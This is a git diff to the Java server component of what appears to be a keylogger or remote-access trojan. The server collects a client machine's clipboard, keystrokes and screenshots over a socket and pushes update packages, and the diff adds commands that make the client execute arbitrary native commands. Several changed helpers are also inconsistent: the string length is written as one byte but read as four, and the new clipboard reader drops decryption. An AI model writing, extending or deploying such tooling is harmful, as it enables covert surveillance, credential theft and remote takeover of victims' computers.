@@ -16,11 +16,14 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.ObjectInputStream;
+import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.io.RandomAccessFile;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.nio.ByteBuffer;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.Scanner;
 import java.util.logging.Level;
 import java.util.logging.Logger;
@@ -29,14 +32,14 @@ import javax.swing.ImageIcon;
 import static jul.JUL.encryptionKey;
 
 public class JULServer {
-    
+
     private static ObjectInputStream objectInputStream;
     private static ImageIcon lastScreneCap;
-    
+
     public static Socket clientSocket;
-    
+
     private static int imageIndex = 1;
-    
+
     public static void main(String[] args) throws Exception {
         int portnumber = 8080;
         ServerSocket serverSocket = new ServerSocket(portnumber);
@@ -55,11 +58,7 @@ public class JULServer {
         while (type != -1) {
             switch ((byte) type) {
                 case JUL.CLIPBOARD_DATA:
-                    dataParam = readOffInt(in);
-                    StringBuilder clipboard = new StringBuilder();
-                    for (int i = 0; i < dataParam; i++) {
-                        clipboard.append((char) decrypt((byte) in.read()));
-                    }
+                    String clipboard = readOffString(in);
                     System.out.println("The clipboard sent was: " + clipboard.toString());
                     break;
                 case JUL.KEY_PRESSED_CODE:
@@ -80,13 +79,16 @@ public class JULServer {
                     System.out.println("A screne cap was sent.");
                     lastScreneCap = (ImageIcon) objectInputStream.readObject();
                     objectInputStream = null;
-                    saveImage(lastScreneCap, "./screnecap " + imageIndex++ + ".png");
+                    saveImage(lastScreneCap, "./screnecaps/screnecap " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(new Date()) + ".png");
                     break;
                 case JUL.SEND_VERSION:
                     dataParam = in.read();
                     System.out.println("A version number was sent: " + dataParam);
                     break;
-                    
+                case JUL.EXECUTING_NATIVE_COMMAND:
+                    System.out.println("The client has responded that it is executing a native command.");
+                    break;
+
             }
             type = in.read();
             //System.out.println("next type processed and was: " + type);
@@ -97,7 +99,9 @@ public class JULServer {
     public static void waitForExit() {
         Scanner usrin = new Scanner(System.in);
         while (true) {
-            String command = usrin.nextLine();
+            String commandLine = usrin.nextLine();
+            String[] commandParts = commandLine.split(" ");
+            String command = commandParts[0];
             if (command.equals("kill") || command.equals("quit")) {
                 try {
                     System.out.println("terminating client and server");
@@ -115,7 +119,7 @@ public class JULServer {
                     byte[] bytes = new byte[(int) f.length()];
                     f.read(bytes);
                     clientSocket.getOutputStream().write(JUL.UPDATE_PACKAGE);
-                    clientSocket.getOutputStream().write(ByteBuffer.allocate(Integer.BYTES).putInt((int)f.length()).array());
+                    clientSocket.getOutputStream().write(ByteBuffer.allocate(Integer.BYTES).putInt((int) f.length()).array());
                     clientSocket.getOutputStream().write(bytes);
                     System.exit(0);
                 } catch (Exception ex) {
@@ -123,16 +127,27 @@ public class JULServer {
                 }
             } else if (command.equals("version")) {
                 try {
-                   clientSocket.getOutputStream().write(JUL.REQUEST_VERSION);
+                    clientSocket.getOutputStream().write(JUL.REQUEST_VERSION);
                 } catch (Exception ex) {
                     Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                 }
+            } else if (command.equals("exec") || command.equals("execute")) {
+                try {
+                    clientSocket.getOutputStream().write(JUL.EXEC_NATIVE_COMMAND);
+                    
+                    writeString(commandLine.replace(command + " ", ""), clientSocket.getOutputStream());
+                } catch (Exception ex) {
+                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
+                }
+            } else {
+                System.out.println("No such command: " + command);
             }
-            
+
         }
     }
-    
+
     static byte[] br = new byte[4];
+
     static int readOffInt(InputStream inputStream) throws IOException {
         br[0] = (byte) inputStream.read();//reasde size into a byte array
         br[1] = (byte) inputStream.read();
@@ -140,7 +155,7 @@ public class JULServer {
         br[3] = (byte) inputStream.read();
         return getInt(br);
     }
-    
+
     static int getInt(byte[] rno) {
         int i = (rno[0] << 24) & 0xff000000
                 | (rno[1] << 16) & 0x00ff0000
@@ -148,27 +163,29 @@ public class JULServer {
                 | (rno[3] << 0) & 0x000000ff;
         return i;
     }
-    
+
     private static int encryptionIndex = 0;
+
     public static byte decrypt(byte b) {
         encryptionIndex = (encryptionIndex + 1) % encryptionKey.length;
         return (byte) (b ^ encryptionKey[encryptionIndex]);
     }
-    
+
     public static byte[] decrypt(byte[] barr) {
         byte[] result = new byte[barr.length];
-         for (int i = 0; i < barr.length; i++) {
-             result[i] = decrypt(barr[i]);
-         }
-         return result;
+        for (int i = 0; i < barr.length; i++) {
+            result[i] = decrypt(barr[i]);
+        }
+        return result;
     }
-    
+
     BufferedImage bi;
+
     private static void saveImage(ImageIcon img, String path) throws IOException {
         File outputfile = new File(path);
         ImageIO.write(toBufferedImage(img.getImage()), "png", outputfile);
     }
-    
+
     public static BufferedImage toBufferedImage(Image img) {
         if (img instanceof BufferedImage) {
             return (BufferedImage) img;
@@ -184,5 +201,19 @@ public class JULServer {
 
         // Return the buffered image
         return bimage;
+    }
+
+    private static String readOffString(InputStream inputStream) throws IOException {
+        int length = readOffInt(inputStream);
+        StringBuilder result = new StringBuilder();
+        for (int i = 0; i < length; i++) {
+            result.append((char) inputStream.read());
+        }
+        return result.toString();
+    }
+    
+    private static void writeString(String s, OutputStream out) throws IOException {
+        out.write(s.length());
+        out.write(s.getBytes());
     }
 }
